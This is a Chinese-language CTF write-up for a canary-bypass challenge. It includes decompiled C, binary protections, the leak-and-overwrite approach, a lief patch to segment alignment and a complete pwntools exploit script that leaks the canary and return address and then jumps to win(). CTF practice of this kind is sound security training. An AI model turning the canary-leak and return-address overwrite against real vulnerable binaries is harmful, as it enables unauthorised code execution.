类型：

canary 绕过



代码：

```c
undefined8 main(void)

{
  uint uVar1;
  long in_FS_OFFSET;
  undefined local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  puts("Message taker.");
  printf("Message: ");
  __isoc99_scanf(&DAT_00100ccd,local_38);
  getchar();
LAB_00100b15:
  do {
    while( true ) {
      while( true ) {
        print_menu();
        printf("> ");
        uVar1 = get_choice();
        if (uVar1 != 1) break;
        printf("Message: ");
        __isoc99_scanf(&DAT_00100ccd,local_38);                               // C
        getchar();
      }
      if (1 < (int)uVar1) break;
      if (uVar1 == 0) {
        if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
          return 0;
        }
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
LAB_00100bca:
      printf("Error: %d is not a valid option\n",(ulong)uVar1);               // B
    }
    if (uVar1 != 2) {
      if (uVar1 != 3) goto LAB_00100bca;
      if (admin != 0) {
        win();                                                                // D
      }
      goto LAB_00100b15;
    }
    printf("Your message: %s\n",local_38);
  } while( true );
}

undefined get_choice(void)

{
  int iVar1;
  long in_FS_OFFSET;
  undefined local_1a [4];
  undefined local_16;
  undefined local_15;
  undefined local_14;
  undefined local_13;
  undefined local_12;
  undefined local_11;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_1a[0] = 0;
  local_1a[1] = 1;
  local_1a[2] = 2;
  local_1a[3] = 3;
  local_16 = 4;
  local_15 = 5;
  local_14 = 6;
  local_13 = 7;
  local_12 = 8;
  local_11 = 9;
  iVar1 = getchar();
  getchar();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return local_1a[(char)iVar1 + -0x30];                // A
}

void win(void)

{
  system("cat flag");
  return;
}
```



安全参数：

```
[*] '/home/noevil/share/pwn/challenge_38/image/challenge/challenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```



思路：

- 通过A行和B行配合得到canary和返回地址，再通过C行将返回地址改为win函数；

- C行的scanf(%s) 遇到下列字符会当做结尾处理，不再接受输入，所以payload里不能包含这些字符；

  `[0, 9, 10, 11, 12, 13, 32]`

- 刚好两个可用的返回地址（win函数入口和D行），都包含了这些字符；

  

  ```
  $ readelf -Wl challenge
  
  Elf file type is DYN (Shared object file)
  Entry point 0x890
  There are 9 program headers, starting at offset 64
  
  Program Headers:
    Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align
    PHDR           0x000040 0x0000000000000040 0x0000000000000040 0x0001f8 0x0001f8 R E 0x8
    INTERP         0x000238 0x0000000000000238 0x0000000000000238 0x00001c 0x00001c R   0x1
        [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
    LOAD           0x000000 0x0000000000000000 0x0000000000000000 0x000f1c 0x000f1c R E 0x200000
    LOAD           0x001d90 0x0000000000201d90 0x0000000000201d90 0x000280 0x000458 RW  0x200000
    DYNAMIC        0x001da8 0x0000000000201da8 0x0000000000201da8 0x0001c0 0x0001c0 RW  0x8
    NOTE           0x000254 0x0000000000000254 0x0000000000000254 0x000044 0x000044 R   0x4
    GNU_EH_FRAME   0x000d0c 0x0000000000000d0c 0x0000000000000d0c 0x000064 0x000064 R   0x4
    GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10
    GNU_RELRO      0x001d90 0x0000000000201d90 0x0000000000201d90 0x000270 0x000270 R   0x1
  ```

  查看段对齐信息，发现代码的alignment都很大，也就是返回地址总是包含上述字符（远程没有该问题）。

  修改对齐信息：

  ```python
  import lief
  
  binary = lief.parse('./challenge')
  for seg in binary.segments:
      if seg.alignment == 0x200000:
          seg.alignment = 8
  binary.write('./challenge.patched')
  
  ```

​		现在本地可以正常调试了。

- 另外，canary第一个字符总是为空字符，所以要调用C行两次：
  - 第一次写入一个非空字符，payload的长度覆盖到main返回地址；
  - 第二次写回空字符；



脚本：

```python
from pwn import *


# p = remote('svc.pwnable.xyz', 30017)
p = process('./challenge.patched')
p.sendlineafter(b'Message: ', b'a')


# 总是以0开头
canary = p8(0)
for i in range(11, 18):
    payload = str.encode(chr(ord('0')+i))
    p.sendlineafter(b'> ', payload)
    line = p.recvuntil(b'Menu:')
    if b'Error:' in line:
        b = line[7:-28]
        canary += p8(int(b))
    else:
        error(line)
canary = u64(canary)
print('canary', hex(canary))


# 获取返回地址
ret_addr = b''
for i in range(26, 32):
    payload = str.encode(chr(ord('0')+i))
    p.sendlineafter(b'> ', payload)
    try:
        line = p.recvuntil(b'Menu:')
        if b'Error:' in line:
            b = line[7:-28]
            ret_addr += p8(int(b))
        else:
            error(line)
    except:
        break
if len(ret_addr) < 8:
    ret_addr = ret_addr + (p8(0) * (8 - len(ret_addr)))
ret_addr = u64(ret_addr)
print('return address', hex(ret_addr))


# 计算win函数地址
win_addr = 0xaac - 0xb30 + ret_addr
print('win address:', hex(win_addr))

# 覆盖返回地址
payload = b'a' * (0x30 - 0x8)
payload += b'a' + p64(canary)[1:]      # 确保没有空字符
payload += b'a' * 8
payload += p64(win_addr)[:6]


# scanf(%s) 将这些字符视为结束字符
# 如果payload中有这些字符，后面的内容不会被读取
filters = [0, 9, 10, 11, 12, 13, 32]
for b in payload:
    if b in filters:
        error('damn it:' + str(b))


p.sendlineafter(b'> ', b'1')
print('payload', payload)
p.sendlineafter(b'Message: ', payload)


# 覆盖canary
payload = b'a' * (0x30 - 0x8)
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Message: ', payload)


# ret2win
p.sendlineafter(b'> ', b'0')
p.interactive()

```

